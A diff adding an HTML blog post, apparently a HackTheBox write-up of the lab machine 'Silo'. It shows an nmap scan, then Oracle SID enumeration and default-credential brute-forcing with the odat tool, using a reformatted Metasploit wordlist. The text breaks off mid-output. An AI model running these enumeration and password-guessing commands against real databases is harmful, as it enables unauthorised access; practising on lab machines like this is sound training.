@@ -1,0 +1,655 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="Silo | Welcome to another retired box from HTB named Silo. This box was really interesting as for the first time I experienced PenTesting against an...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">
+
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.12.3/jquery.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>
+
+  
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>Silo</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation">
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="https://sittingducks.io" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (13)</a> &#124; 
+                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="https://sittingducks.io/archives.html" >Archives (15)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2020-04-14 02:06:00+01:00">Tue 14 April 2020</time></span>
+        <h1 class="entry-title"><a href="https://sittingducks.io/Silo.html">Silo</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="https://sittingducks.io/Silo.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <p>Welcome to another retired box from HTB named Silo. This box was really interesting as for the first time I experienced PenTesting against an Oracle db. To me this is more relevant than, for example, working with a wordpress exploit. Although the latter would still be very useful for learning purposes, it is very unlikely I will find some of my customers running wordpress. It is, on the other hand, very common that customers I work with use Orable db or similar technologies. I found the box relatively easy thanks to a tool call <code>odat</code>, even if its installation could be somewhat tedious. I had another issue with a special character where I got stuck but eventually found a workaround.    </p>
+<h1>NMAP</h1>
+<div class="highlight"><pre><span></span><span class="err">┌─</span><span class="o">[</span><span class="n">✗</span><span class="o">]</span><span class="err">─</span><span class="o">[</span><span class="n">doluar@parrot</span><span class="o">]</span><span class="err">─</span><span class="o">[</span><span class="n">~</span><span class="o">]</span><span class="w"></span>
+<span class="err">└──╼</span><span class="w"> </span><span class="err">$</span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">-</span><span class="n">sC</span><span class="w"> </span><span class="mf">10.10.10.82</span><span class="w"></span>
+<span class="n">Starting</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="mf">7.80</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2020</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">14</span><span class="w"> </span><span class="mi">05</span><span class="err">:</span><span class="mi">36</span><span class="w"> </span><span class="n">BST</span><span class="w"></span>
+<span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mf">10.10.10.82</span><span class="w"></span>
+<span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="p">(</span><span class="mf">0.11</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">).</span><span class="w"></span>
+<span class="ow">Not</span><span class="w"> </span><span class="nl">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">988</span><span class="w"> </span><span class="n">closed</span><span class="w"> </span><span class="n">ports</span><span class="w"></span>
+<span class="n">PORT</span><span class="w">      </span><span class="k">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w">      </span><span class="n">VERSION</span><span class="w"></span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span><span class="w">    </span><span class="k">open</span><span class="w">  </span><span class="n">http</span><span class="w">         </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">HTTPAPI</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="mf">2.0</span><span class="w"> </span><span class="p">(</span><span class="n">SSDP</span><span class="o">/</span><span class="n">UPnP</span><span class="p">)</span><span class="w"></span>
+<span class="o">|</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="nl">methods</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="n">Potentially</span><span class="w"> </span><span class="n">risky</span><span class="w"> </span><span class="nl">methods</span><span class="p">:</span><span class="w"> </span><span class="n">TRACE</span><span class="w"></span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="nl">header</span><span class="p">:</span><span class="w"> </span><span class="n">Microsoft</span><span class="o">-</span><span class="n">IIS</span><span class="o">/</span><span class="mf">8.5</span><span class="w"></span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="nl">title</span><span class="p">:</span><span class="w"> </span><span class="n">IIS</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">Server</span><span class="w"></span>
+<span class="mi">135</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">msrpc</span><span class="w">        </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">RPC</span><span class="w"></span>
+<span class="mi">139</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span><span class="w">  </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span><span class="w"></span>
+<span class="mi">445</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span><span class="w"> </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">Server</span><span class="w"> </span><span class="mi">2008</span><span class="w"> </span><span class="n">R2</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">2012</span><span class="w"> </span><span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span><span class="w"></span>
+<span class="mi">1521</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="k">open</span><span class="w">  </span><span class="n">oracle</span><span class="o">-</span><span class="n">tns</span><span class="w">   </span><span class="n">Oracle</span><span class="w"> </span><span class="n">TNS</span><span class="w"> </span><span class="n">listener</span><span class="w"> </span><span class="mf">11.2.0.2.0</span><span class="w"> </span><span class="p">(</span><span class="n">unauthorized</span><span class="p">)</span><span class="w"></span>
+<span class="mi">49152</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">msrpc</span><span class="w">        </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">RPC</span><span class="w"></span>
+<span class="mi">49153</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">msrpc</span><span class="w">        </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">RPC</span><span class="w"></span>
+<span class="mi">49154</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">msrpc</span><span class="w">        </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">RPC</span><span class="w"></span>
+<span class="mi">49155</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">msrpc</span><span class="w">        </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">RPC</span><span class="w"></span>
+<span class="mi">49158</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">msrpc</span><span class="w">        </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">RPC</span><span class="w"></span>
+<span class="mi">49160</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">oracle</span><span class="o">-</span><span class="n">tns</span><span class="w">   </span><span class="n">Oracle</span><span class="w"> </span><span class="n">TNS</span><span class="w"> </span><span class="n">listener</span><span class="w"> </span><span class="p">(</span><span class="n">requires</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="n">name</span><span class="p">)</span><span class="w"></span>
+<span class="mi">49161</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">msrpc</span><span class="w">        </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">RPC</span><span class="w"></span>
+<span class="n">Service</span><span class="w"> </span><span class="nl">Info</span><span class="p">:</span><span class="w"> </span><span class="nl">OSs</span><span class="p">:</span><span class="w"> </span><span class="n">Windows</span><span class="p">,</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">Server</span><span class="w"> </span><span class="mi">2008</span><span class="w"> </span><span class="n">R2</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">2012</span><span class="p">;</span><span class="w"> </span><span class="nl">CPE</span><span class="p">:</span><span class="w"> </span><span class="nl">cpe</span><span class="p">:</span><span class="o">/</span><span class="nl">o</span><span class="p">:</span><span class="nl">microsoft</span><span class="p">:</span><span class="n">windows</span><span class="w"></span>
+
+<span class="k">Host</span><span class="w"> </span><span class="n">script</span><span class="w"> </span><span class="nl">results</span><span class="p">:</span><span class="w"></span>
+<span class="o">|</span><span class="n">_clock</span><span class="o">-</span><span class="nl">skew</span><span class="p">:</span><span class="w"> </span><span class="nl">mean</span><span class="p">:</span><span class="w"> </span><span class="o">-</span><span class="mi">36</span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="nl">deviation</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="nl">median</span><span class="p">:</span><span class="w"> </span><span class="o">-</span><span class="mi">36</span><span class="n">s</span><span class="w"></span>
+<span class="o">|</span><span class="n">_smb</span><span class="o">-</span><span class="n">os</span><span class="o">-</span><span class="nl">discovery</span><span class="p">:</span><span class="w"> </span><span class="nl">ERROR</span><span class="p">:</span><span class="w"> </span><span class="n">Script</span><span class="w"> </span><span class="n">execution</span><span class="w"> </span><span class="n">failed</span><span class="w"> </span><span class="p">(</span><span class="k">use</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">debug</span><span class="p">)</span><span class="w"></span>
+<span class="o">|</span><span class="w"> </span><span class="n">smb</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="nl">mode</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span><span class="nl">account_used</span><span class="p">:</span><span class="w"> </span><span class="n">guest</span><span class="w"></span>
+<span class="o">|</span><span class="w">   </span><span class="nl">authentication_level</span><span class="p">:</span><span class="w"> </span><span class="k">user</span><span class="w"></span>
+<span class="o">|</span><span class="w">   </span><span class="nl">challenge_response</span><span class="p">:</span><span class="w"> </span><span class="n">supported</span><span class="w"></span>
+<span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="nl">message_signing</span><span class="p">:</span><span class="w"> </span><span class="n">supported</span><span class="w"></span>
+<span class="o">|</span><span class="w"> </span><span class="n">smb2</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="nl">mode</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span><span class="mf">2.02</span><span class="err">:</span><span class="w"> </span>
+<span class="o">|</span><span class="n">_</span><span class="w">    </span><span class="n">Message</span><span class="w"> </span><span class="n">signing</span><span class="w"> </span><span class="n">enabled</span><span class="w"> </span><span class="n">but</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">required</span><span class="w"></span>
+<span class="o">|</span><span class="w"> </span><span class="n">smb2</span><span class="o">-</span><span class="nc">time</span><span class="err">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span><span class="nc">date</span><span class="err">:</span><span class="w"> </span><span class="mi">2020</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">14</span><span class="nl">T04</span><span class="p">:</span><span class="mi">39</span><span class="err">:</span><span class="mi">19</span><span class="w"></span>
+<span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="nl">start_date</span><span class="p">:</span><span class="w"> </span><span class="mi">2020</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">14</span><span class="nl">T03</span><span class="p">:</span><span class="mi">54</span><span class="err">:</span><span class="mi">10</span><span class="w"></span>
+
+<span class="n">Service</span><span class="w"> </span><span class="n">detection</span><span class="w"> </span><span class="n">performed</span><span class="p">.</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="ow">any</span><span class="w"> </span><span class="n">incorrect</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span><span class="w"> </span><span class="p">.</span><span class="w"></span>
+<span class="n">Nmap</span><span class="w"> </span><span class="nl">done</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">IP</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="k">host</span><span class="w"> </span><span class="n">up</span><span class="p">)</span><span class="w"> </span><span class="n">scanned</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="mf">198.40</span><span class="w"> </span><span class="n">seconds</span><span class="w"></span>
+</pre></div>
+
+
+<p>There are quite few open ports. One of these is the default port 80 which gives us the default IIS welcome page when launching it from a browser.</p>
+<p><img alt="" src="../images/silo-webpage.png"></p>
+<p>We know we are dealing with a Windows box and probably a Windows Server 2008 R2 as shown in the nmap output. 
+Furthermore, we can see there is an Oracle listener running. After some research I found a great tool called <a href="https://github.com/quentinhardy/odat">odat</a>, Oracle Database Attacking Tool, which we can use in this scenario. The installation requires quite few steps to be honest but it is eventually worth it!</p>
+<p>Once installed, following the instructions at https://github.com/quentinhardy/odat, we can run the following command to guess the Oracle SID, that is the Oracle System ID used to uniquely identify a database on a system. </p>
+<div class="highlight"><pre><span></span><span class="err">┌─</span><span class="p">[</span><span class="n">doluar</span><span class="nd">@parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="o">~/</span><span class="n">Tools</span><span class="o">/</span><span class="n">odat</span><span class="p">]</span>
+<span class="err">└──╼</span> <span class="err">$</span><span class="n">python3</span> <span class="n">odat</span><span class="o">.</span><span class="n">py</span> <span class="n">sidguesser</span> <span class="o">-</span><span class="n">s</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.82</span> <span class="o">-</span><span class="n">p</span> <span class="mi">1521</span>
+<span class="n">odat</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span> <span class="ne">DeprecationWarning</span><span class="p">:</span> <span class="n">the</span> <span class="n">imp</span> <span class="n">module</span> <span class="ow">is</span> <span class="n">deprecated</span> <span class="ow">in</span> <span class="n">favour</span> <span class="n">of</span> <span class="n">importlib</span><span class="p">;</span> <span class="n">see</span> <span class="n">the</span> <span class="n">module</span><span class="s1">&#39;s documentation for alternative uses</span>
+  <span class="kn">import</span> <span class="nn">imp</span>
+
+<span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">(</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.82</span><span class="p">:</span><span class="mi">1521</span><span class="p">):</span> <span class="n">Searching</span> <span class="n">valid</span> <span class="n">SIDs</span>
+<span class="p">[</span><span class="mf">1.1</span><span class="p">]</span> <span class="n">Searching</span> <span class="n">valid</span> <span class="n">SIDs</span> <span class="n">thanks</span> <span class="n">to</span> <span class="n">a</span> <span class="n">well</span> <span class="n">known</span> <span class="n">SID</span> <span class="nb">list</span> <span class="n">on</span> <span class="n">the</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.82</span><span class="p">:</span><span class="mi">1521</span> <span class="n">server</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="s1">&#39;XE&#39;</span> <span class="ow">is</span> <span class="n">a</span> <span class="n">valid</span> <span class="n">SID</span><span class="o">.</span> <span class="n">Continue</span><span class="o">...</span>                   <span class="c1">##################################################################################################################################################################  | ETA:  00:00:01 </span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="s1">&#39;XEXDB&#39;</span> <span class="ow">is</span> <span class="n">a</span> <span class="n">valid</span> <span class="n">SID</span><span class="o">.</span> <span class="n">Continue</span><span class="o">...</span>                
+<span class="mi">100</span><span class="o">%</span> <span class="o">|</span><span class="c1">#####################################################################################################################################################################################################################| Time: 00:03:15 </span>
+<span class="p">[</span><span class="mf">1.2</span><span class="p">]</span> <span class="n">Searching</span> <span class="n">valid</span> <span class="n">SIDs</span> <span class="n">thanks</span> <span class="n">to</span> <span class="n">a</span> <span class="n">brute</span><span class="o">-</span><span class="n">force</span> <span class="n">attack</span> <span class="n">on</span> <span class="mi">1</span> <span class="n">chars</span> <span class="n">now</span> <span class="p">(</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.82</span><span class="p">:</span><span class="mi">1521</span><span class="p">)</span>
+<span class="mi">100</span><span class="o">%</span> <span class="o">|</span><span class="c1">#####################################################################################################################################################################################################################| Time: 00:00:06 </span>
+<span class="p">[</span><span class="mf">1.3</span><span class="p">]</span> <span class="n">Searching</span> <span class="n">valid</span> <span class="n">SIDs</span> <span class="n">thanks</span> <span class="n">to</span> <span class="n">a</span> <span class="n">brute</span><span class="o">-</span><span class="n">force</span> <span class="n">attack</span> <span class="n">on</span> <span class="mi">2</span> <span class="n">chars</span> <span class="n">now</span> <span class="p">(</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.82</span><span class="p">:</span><span class="mi">1521</span><span class="p">)</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="s1">&#39;XE&#39;</span> <span class="ow">is</span> <span class="n">a</span> <span class="n">valid</span> <span class="n">SID</span><span class="o">.</span> <span class="n">Continue</span><span class="o">...</span>                   <span class="c1">############################################################################################################################################                        | ETA:  00:00:18 </span>
+<span class="mi">100</span><span class="o">%</span> <span class="o">|</span><span class="c1">#####################################################################################################################################################################################################################| Time: 00:02:51 </span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">SIDs</span> <span class="n">found</span> <span class="n">on</span> <span class="n">the</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.82</span><span class="p">:</span><span class="mi">1521</span> <span class="n">server</span><span class="p">:</span> <span class="n">XE</span><span class="p">,</span><span class="n">XEXDB</span>
+</pre></div>
+
+
+<p>From the output we deduct there are two SIDs, <code>XE</code> and <code>XEXDB</code>.</p>
+<p>Now that we have the SID we can try to guess the password this way:</p>
+<div class="highlight"><pre><span></span><span class="err">┌─</span><span class="o">[</span><span class="n">doluar@parrot</span><span class="o">]</span><span class="err">─</span><span class="o">[</span><span class="n">~/Tools/odat</span><span class="o">]</span><span class="w"></span>
+<span class="err">└──╼</span><span class="w"> </span><span class="err">$</span><span class="n">python3</span><span class="w"> </span><span class="n">odat</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="n">passwordguesser</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="mf">10.10.10.82</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="n">XE</span><span class="w"> </span>
+
+<span class="o">[</span><span class="n">1</span><span class="o">]</span><span class="w"> </span><span class="p">(</span><span class="mf">10.10.10.82</span><span class="err">:</span><span class="mi">1521</span><span class="p">)</span><span class="err">:</span><span class="w"> </span><span class="n">Searching</span><span class="w"> </span><span class="n">valid</span><span class="w"> </span><span class="n">accounts</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="mf">10.10.10.82</span><span class="w"> </span><span class="n">server</span><span class="p">,</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="mi">1521</span><span class="w"></span>
+<span class="n">The</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="n">CIS</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">already</span><span class="w"> </span><span class="n">been</span><span class="w"> </span><span class="n">tested</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">least</span><span class="w"> </span><span class="n">once</span><span class="p">.</span><span class="w"> </span><span class="n">What</span><span class="w"> </span><span class="n">do</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">want</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="nl">do</span><span class="p">:</span><span class="w">                                                                                                                                               </span><span class="o">|</span><span class="w"> </span><span class="nl">ETA</span><span class="p">:</span><span class="w">  </span><span class="mi">00</span><span class="err">:</span><span class="mi">08</span><span class="err">:</span><span class="mi">35</span><span class="w"> </span>
+<span class="o">-</span><span class="w"> </span><span class="n">stop</span><span class="w"> </span><span class="p">(</span><span class="n">s</span><span class="o">/</span><span class="n">S</span><span class="p">)</span><span class="w"></span>
+<span class="o">-</span><span class="w"> </span><span class="k">continue</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">ask</span><span class="w"> </span><span class="k">every</span><span class="w"> </span><span class="nc">time</span><span class="w"> </span><span class="p">(</span><span class="n">a</span><span class="o">/</span><span class="n">A</span><span class="p">)</span><span class="w"></span>
+<span class="o">-</span><span class="w"> </span><span class="k">continue</span><span class="w"> </span><span class="k">without</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">ask</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="o">/</span><span class="n">C</span><span class="p">)</span><span class="w"></span>
+<span class="n">c</span><span class="w"></span>
+<span class="mi">100</span><span class="o">%</span><span class="w"> </span><span class="o">|</span><span class="err">#####################################################################################################################################################################################################################</span><span class="o">|</span><span class="w"> </span><span class="nc">Time</span><span class="err">:</span><span class="w"> </span><span class="mi">00</span><span class="err">:</span><span class="mi">11</span><span class="err">:</span><span class="mi">33</span><span class="w"> </span>
+<span class="o">[</span><span class="n">-</span><span class="o">]</span><span class="w"> </span><span class="k">No</span><span class="w"> </span><span class="k">found</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">valid</span><span class="w"> </span><span class="n">account</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="mf">10.10.10.82</span><span class="err">:</span><span class="mi">1521</span><span class="o">/</span><span class="n">XE</span><span class="p">.</span><span class="w"> </span><span class="n">You</span><span class="w"> </span><span class="n">should</span><span class="w"> </span><span class="k">try</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">option</span><span class="w"> </span><span class="s1">&#39;--accounts-file accounts/accounts_multiple.txt&#39;</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="s1">&#39;--accounts-file accounts/logins.txt accounts/pwds.txt&#39;</span><span class="w"></span>
+</pre></div>
+
+
+<p>After about 10 minutes <code>odat</code> did not find anything. After some more research I found someone on the web suggesting to use metasploit Oracle wordlist file because it contains non-capital and capital words whereas <code>odat</code> default wordlist file contains words only in capital. Odat default wordlist file is located under <code>odat/accounts/accounts.txt</code> and it contains credentials on this format:</p>
+<p><code>USER/PASSWORD</code></p>
+<p>whwreas metasploit wordlist file contains the credentials in this format:</p>
+<p><code>USER PASSWORD</code></p>
+<p>So I changed the format of the oracle wordlist file to be the same as the odat default one. </p>
+<p>I did this within <code>vim</code> by running <code>:%s/ /\//g</code>.</p>
+<p>After that I re-ran the command using the new wordlist file:</p>
+<div class="highlight"><pre><span></span><span class="err">┌─</span><span class="o">[</span><span class="n">✗</span><span class="o">]</span><span class="err">─</span><span class="o">[</span><span class="n">doluar@parrot</span><span class="o">]</span><span class="err">─</span><span class="o">[</span><span class="n">~/Tools/odat</span><span class="o">]</span><span class="w"></span>
+<span class="err">└──╼</span><span class="w"> </span><span class="err">$</span><span class="n">python3</span><span class="w"> </span><span class="n">odat</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="n">passwordguesser</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="mf">10.10.10.82</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="n">XE</span><span class="w"> </span><span class="c1">--accounts-file accounts/oracle_default_userpass.txt</span>
+
+<span class="o">[</span><span class="n">1</span><span class="o">]</span><span class="w"> </span><span class="p">(</span><span class="mf">10.10.10.82</span><span class="err">:</span><span class="mi">1521</span><span class="p">)</span><span class="err">:</span><span class="w"> </span><span class="n">Searching</span><span class="w"> </span><span class="n">valid</span><span class="w"> </span><span class="n">accounts</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="mf">10.10.10.82</span><span class="w"> </span><span class="n">server</span><span class="p">,</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="mi">1521</span><span class="w"></span>
+<span class="n">The</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="n">cdemo82</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">already</span><span class="w"> </span><span class="n">been</span><span class="w"> </span><span class="n">tested</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">least</span><span class="w"> </span><span class="n">once</span><span class="p">.</span><span class="w"> </span><span class="n">What</span><span class="w"> </span><span class="n">do</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">want</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="nl">do</span><span class="p">:</span><span class="w">                                                                                                                                           </span><span class="o">|</span><span class="w"> </span><span class="nl">ETA</span><span class="p">:</span><span class="w">  </span><span class="mi">00</span><span class="err">:</span><span class="mi">09</span><span class="err">:</span><span class="mi">32</span><span class="w"> </span>
+<span class="o">-</span><span class="w"> </span><span class="n">stop</span><span class="w"> </span><span class="p">(</span><span class="n">s</span><span class="o">/</span><span class="n">S</span><span class="p">)</span><span class="w"></span>
